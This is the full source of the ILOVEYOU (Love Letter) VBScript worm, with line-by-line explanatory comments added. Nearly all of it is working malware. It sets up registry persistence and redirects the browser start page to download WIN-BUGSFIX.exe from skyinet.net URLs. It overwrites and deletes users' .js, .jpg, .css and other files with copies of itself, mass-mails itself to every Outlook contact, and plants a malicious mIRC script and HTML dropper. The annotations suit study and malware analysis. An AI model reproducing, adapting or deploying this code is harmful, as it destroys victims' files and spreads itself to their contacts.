rem  barok -loveletter(vbe) <i hate go to school>
rem by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next

rem Setup global variables to be used throughout subroutines and functions.
Dim fso, dirsystem, dirwin, dirtemp, eq, ctr, file, vbscopy, dow
eq = ""
ctr = 0

rem Open the current script file and define "vbscopy" which can be used to
rem read its own contents. Used to replicate itself in other files.
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile(WScript.ScriptFullname, 1)
vbscopy = file.ReadAll

main()

rem Subroutine to initalize the program
Sub main()
  On Error Resume Next
  Dim wscr, rr

  rem Creates a shell which will be used to read the registry.
  Set wscr = CreateObject("WScript.Shell")
  rem Gets a registry key which indicates the scripting time-out from Windows.
  rr = wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")

  rem Checks if the current timeout is more than 0.
  If (rr >= 1) Then
    rem Sets the timeout to 0, effectively making it so that the script won't
    rem time out, incase the system happens to be too slow to execute it.
    wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD"
  End If

  rem Finds special folders, such as system, temporary and windows folders.
  Set dirwin = fso.GetSpecialFolder(0)
  Set dirsystem = fso.GetSpecialFolder(1)
  Set dirtemp = fso.GetSpecialFolder(2)
  Set c = fso.GetFile(WScript.ScriptFullName)

  rem Copy itself into VBScript files MSKernel32.vbs, Win32DLL.vbs and
  rem LOVE-LETTER-FOR-YOU.TXT.vbs
  c.Copy(dirsystem & "\MSKernel32.vbs")
  c.Copy(dirwin & "\Win32DLL.vbs")
  c.Copy(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")

  rem Call the other subroutines.
  regruns()
  html()
  spreadtoemail()
  listadriv()
End Sub

rem Subroutine to create and update special registry values.
Sub regruns()
  On Error Resume Next
  Dim num, downread

  rem Set the system to automatically run MSKernel32.vbs and Win32DLL.vbs on startup.
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32", dirsystem & "\MSKernel32.vbs"
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL", dirwin & "\Win32DLL.vbs"

  rem Get internet Explorer's download directory.
  downread = ""
  downread = regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")

  rem If the directory wasn't found, then use C:\ drive as the download directory.
  If (downread = "") Then
    downread = "c:\"
  End If

  rem Check if a file named "WinFAT32.exe" exists in the system files.
  If (fileexist(dirsystem & "\WinFAT32.exe") = 1) Then
    Randomize

    rem Generate a random number from 1 to 4.
    num = Int((4 * Rnd) + 1)

    rem Randomly update the Internet Explorer's start page that leads to a
    rem page that will download a malicious executable "WIN-BUGSFIX.exe".
    If num = 1 Then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
    ElseIf num = 2 Then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
    ElseIf num = 3 Then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
    ElseIf num = 4 Then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
    End If
  End If

  rem Check if the "WIN-BUGSFIX.exe" file exists in the download directory.
  If (fileexist(downread & "\WIN-BUGSFIX.exe") = 0) Then
    rem Add WIN-BUGSFIX.exe to run on startup
    regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX", downread & "\WIN-BUGSFIX.exe"
    rem Update Internet Explorer's start page to "about:blank"
    regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\StartPage", "about:blank"
  End If
End Sub

rem Subroutine to list folders in drives.
Sub listadriv()
  On Error Resume Next
  Dim d, dc, s

  Set dc = fso.Drives

  For Each d In dc
    If (d.DriveType = 2) Or (d.DriveType = 3) Then
      folderlist(d.path & "\")
    End If
  Next

  listadriv = s
End Sub

rem Subroutine infect other files, by copying itself into them as well
rem as creating a malicious mIRC script.
Sub infectfiles(folderspec)
  On Error Resume Next
  Dim f, f1, fc, ext, ap, mircfname, s, bname, mp3

  Set f = fso.GetFolder(folderspec)
  Set fc = f.Files

  For Each f1 In fc
    ext = fso.GetExtensionName(f1.path)
    ext = lcase(ext)
    s = lcase(f1.name)

    rem Copies itself into every file with vbs/vbe extension.
    If (ext = "vbs") Or (ext = "vbe") Then
      Set ap = fso.OpenTextFile(f1.path, 2, true)

      ap.write vbscopy
      ap.close
    rem Copies itself into every file with js/jse/css/wsh/sct/hta extension
    rem and creates a copy of the file with the .vbs extension.
    ElseIf (ext = "js")
      Or (ext = "jse")
      Or (ext = "css")
      Or (ext = "wsh")
      Or (ext = "sct")
      Or (ext = "hta")
    Then
      Set ap = fso.OpenTextFile(f1.path, 2, true)

      ap.write vbscopy
      ap.close
      bname = fso.GetBaseName(f1.path)

      Set cop = fso.GetFile(f1.path)

      cop.copy(folderspec & "\" & bname & ".vbs")
      fso.DeleteFile(f1.path)
    rem Copies itself into every file with jpg/jpeg extension
    rem and creates a copy of the file with the .vbs extension.
    ElseIf (ext = "jpg") Or (ext = "jpeg") Then
      rem Copies itself
      Set ap = fso.OpenTextFile(f1.path, 2, true)

      ap.write vbscopy
      ap.close

      Set cop = fso.GetFile(f1.path)

      cop.copy(f1.path & ".vbs")
      fso.DeleteFile(f1.path)
    rem Copies itself into every file with mp3/mp2 extension.
    ElseIf (ext = "mp3") Or (ext = "mp2") Then
      Set mp3 = fso.CreateTextFile(f1.path & ".vbs")

      mp3.write vbscopy
      mp3.close

      Set att = fso.GetFile(f1.path)
      rem Sets file attributes to make the file Hidden.
      rem Normal files have the attribute set to 0 so adding 2 to it,
      rem will set the attributes to Hidden.
      att.attributes = att.attributes + 2
    End If

    rem Checks if the folder has already been infected, if not it will continue
    rem to infect the files.
    If (eq <> folderspec) Then
      rem Looks for mIRC and related files to determine whether it
      rem should create/replace its script.ini with a malicious script.
      If (s = "mirc32.exe")
        Or (s = "mlink32.exe")
        Or (s = "mirc.ini")
        Or (s = "script.ini")
        Or (s = "mirc.hlp")
      Then
        Set scriptini = fso.CreateTextFile(folderspec & "\script.ini")
        rem The following mIRC script checks if the "nick" of a user is the same
        rem as "me" to halt and send a DCC command that will send a message to
        rem the user with a link to the LOVE=LETTER-FOR-YOU html page on the
        rem system.
        scriptini.WriteLine "[script]"
        scriptini.WriteLine ";mIRC Script"
        scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, If mIRC will"
        scriptini.WriteLine "    corrupt... WINDOWS will affect and will not run correctly. thanks"
        scriptini.WriteLine ";"
        scriptini.WriteLine ";Khaled Mardam-Bey"
        scriptini.WriteLine ";http://www.mirc.com"
        scriptini.WriteLine ";"
        scriptini.WriteLine "n0=on 1:JOIN:#:{"
        scriptini.WriteLine "n1=  /If ( $nick == $me ) { halt }"
        scriptini.WriteLine "n2=  /.dcc send $nick" & dirsystem & "\LOVE-LETTER-FOR-YOU.HTM"
        scriptini.WriteLine "n3=}"
        scriptini.close

        eq = folderspec
      End If
    End If
  Next
End Sub

rem Subroutine used to get file listing of a folder.
Sub folderlist(folderspec)
  On Error Resume Next
  Dim f, f1, sf

  Set f = fso.GetFolder(folderspec)
  Set sf = f.SubFolders

  rem Iterates over each subfolder from the given top-level folder and
  rem recursively infect files.
  For Each f1 In sf
    infectfiles(f1.path)
    folderlist(f1.path)
  Next
End Sub

rem Subroutine used to create/write registry entries.
Sub regcreate(regkey,regvalue)
  Set regedit = CreateObject("WScript.Shell")
  regedit.RegWrite regkey, regvalue
End Sub

rem Subroutine used to get registry entries.
Function regget(value)
  Set regedit = CreateObject("WScript.Shell")
  regget = regedit.RegRead(value)
End Function

rem Function to check if a file exists.
Function fileexist(filespec)
  On Error Resume Next
  Dim msg

  If (fso.FileExists(filespec)) Then
    msg = 0
  Else
    msg = 1
  End If

  fileexist = msg
End Function

rem Function to check if a folder exists.
Function folderexist(folderspec)
  On Error Resume Next
  Dim msg

  If (fso.GetFolderExists(folderspec)) Then
    msg = 0
  Else
    msg = 1
  End If

  fileexist = msg
End Function

rem Subroutine to send emails to the user's contacts through MAPI
rem (Messaging Application Programming Interface), the API used by Outlook to
rem communicate with the Microsoft Exchange Server which also hosts calendars
rem and address book.
Sub spreadtoemail()
  On Error Resume Next
  Dim x, a, ctrlists, ctrentries, malead, b, regedit, regv, regad

  rem Creates a shell to edit the registry.
  Set regedit = CreateObject("WScript.Shell")
  rem Creates a new Outlook application object instance, to access the MAPI.
  Set out = WScript.CreateObject("Outlook.Application")
  rem Gets the MAPI namespace used to access the address book lists.
  Set mapi = out.GetNameSpace("MAPI")

  rem Goes through all contacts in the address book and sends an email
  rem with the LOVE-LETTER-FOR-YOU program as an attachment.
  For ctrlists = 1 To mapi.AddressLists.Count
    Set a = mapi.AddressLists(ctrlists)
    x = 1
    rem Gets a registry key that is used to check who has been sent an email,
    rem already to ensure that even if there may be duplicate contacts, it will
    rem only send the email once to the same address.
    regv = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a)

    If (regv = "") Then
      regv = 1
    End If

    If (int(a.AddressEntries.Count) > int(regv)) Then
      rem Iterates over each entry in the address list.
      For ctrentries = 1 To a.AddressEntries.Count
        malead = a.AddressEntries(x)
        regad = ""
        regad = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead )

        rem If the contact hasn't yet been sent an email, a new email will be
        rem composed with the virus attached and a "kind" message and the
        rem subject "ILOVEYOU".
        If (regad = "") Then
          Set male = out.CreateItem(0)

          male.Recipients.Add(malead)
          male.Subject = "ILOVEYOU"
          male.Body = vbcrlf & "kindly check the attached LOVELETTER coming from me."
          male.Attachments.Add(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")
          male.Send

          rem Sets the registry key to indicate that the email has been sent
          rem to the current contact.
          regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead, 1, "REG_DWORD"
        End If

        x = x + 1
      Next

      regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a, a.AddressEntries.Count
    Else
      regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a, a.AddressEntries.Count
    End If
  Next

  Set out = Nothing
  Set mapi = Nothing
End Sub

rem Subroutine to generate and create the HTML file for LOVE-LETTER-FOR-YOU.HTM.
Sub html
  On Error Resume Next
  Dim lines, n, dta1, dta2, dt1, dt2, dt3, dt4, l1, dt5, dt6

  rem Generates an HTML page which contains a JScript and VBScript to replicate
  rem itself by leveraging ActiveX. It also listens for mouse and key events,
  rem which will open additional windows of the same page.
  dta1 = "<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"
    & vbcrlf & _ "<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"
    & vbcrlf & _ "<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"
    & vbcrlf & _ "<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "
    & vbcrlf & _ "ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"
    & vbcrlf & _ "<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"
    & vbcrlf & _ "<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE>"
    & vbcrlf & _ "<?-?BODY><?-?HTML>"
    & vbcrlf & _ "<SCRIPT language=@-@JScript@-@>"
    & vbcrlf & _ "<!--?-??-?"
    & vbcrlf & _ "If (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"
    & vbcrlf & _ "?-??-?-->"
    & vbcrlf & _ "<?-?SCRIPT>"
    & vbcrlf & _ "<SCRIPT LANGUAGE=@-@VBScript@-@>"
    & vbcrlf & _ "<!--"
    & vbcrlf & _ "on error resume next"
    & vbcrlf & _ "Dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"
    & vbcrlf & _ "aw=1"
    & vbcrlf & _ "code="

  dta2 = "Set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"
    & vbcrlf & _ "Set dirsystem=fso.GetSpecialFolder(1)"
    & vbcrlf & _ "code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"
    & vbcrlf & _ "code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"
    & vbcrlf & _ "code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"
    & vbcrlf & _ "set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"
    & vbcrlf & _ "wri.write code4"
    & vbcrlf & _ "wri.close"
    & vbcrlf & _ "If (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) Then"
    & vbcrlf & _ "If (err.number=424) Then"
    & vbcrlf & _ "aw=0"
    & vbcrlf & _ "End If"
    & vbcrlf & _ "If (aw=1) Then"
    & vbcrlf & _ "document.write @-@ERROR: can#-#t initialize ActiveX@-@"
    & vbcrlf & _ "window.close"
    & vbcrlf & _ "End If"
    & vbcrlf & _ "End If"
    & vbcrlf & _ "Set regedit = CreateObject(@-@WScript.Shell@-@)"
    & vbcrlf & _ "regedit.RegWrite@-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"
    & vbcrlf & _ "?-??-?-->"
    & vbcrlf & _ "<?-?SCRIPT>"

  rem Replaces encoded characters from the above document to form a valid
  rem document that can be correctly opened and executed in the browser.
  dt1 = replace(dta1, chr(35) & chr(45) & chr(35), "'")
  dt1 = replace(dt1, chr(64) & chr(45) & chr(64), """")
  dt4 = replace(dt1, chr(63) & chr(45) & chr(63), "/")
  dt5 = replace(dt4, chr(94) & chr(45) & chr(94), "\")
  dt2 = replace(dta2, chr(35) & chr(45) & chr(35), "'")
  dt2 = replace(dt2, chr(64) & chr(45) & chr(64), """")
  dt3 = replace(dt2, chr(63) & chr(45) & chr(63), "/")
  dt6 = replace(dt3, chr(94) & chr(45) & chr(94), "\")

  rem Opens a new file system object, which is used to read this specific
  rem script file, that will then be injected into the HTM document.
  Set fso = CreateObject("Scripting.FileSystemObject")
  Set c = fso.OpenTextFile(WScript.ScriptFullName, 1)

  lines = Split(c.ReadAll,vbcrlf)
  l1 = ubound(lines)

  rem Encodes all special characters of the script's HTM, as this script
  rem will be injected into the HTM file and executed.
  For n = 0 to ubound(lines)
    lines(n) = replace(lines(n), "'", chr(91) + chr(45) + chr(91))
    lines(n) = replace(lines(n), """", chr(93) + chr(45) + chr(93))
    lines(n) = replace(lines(n), "\", chr(37) + chr(45) + chr(37))

    If (l1 = n) Then
      lines(n) = chr(34) + lines(n) + chr(34)
    Else
      lines(n) = chr(34) + lines(n) + chr(34) & " & vbcrlf & _"
    End If
  Next

  rem Create the LOVE-LETTER-FOR-YOU.HTM file in the system directory.
  Set b = fso.CreateTextFile(dirsystem + "\LOVE-LETTER-FOR-YOU.HTM")
  b.close

  rem Creates the HTM file from everything above.
  Set d = fso.OpenTextFile(dirsystem + "\LOVE-LETTER-FOR-YOU.HTM", 2)
  d.write dt5
  d.write join(lines, vbcrlf)
  d.write vbcrlf
  d.write dt6
  d.close
End Sub
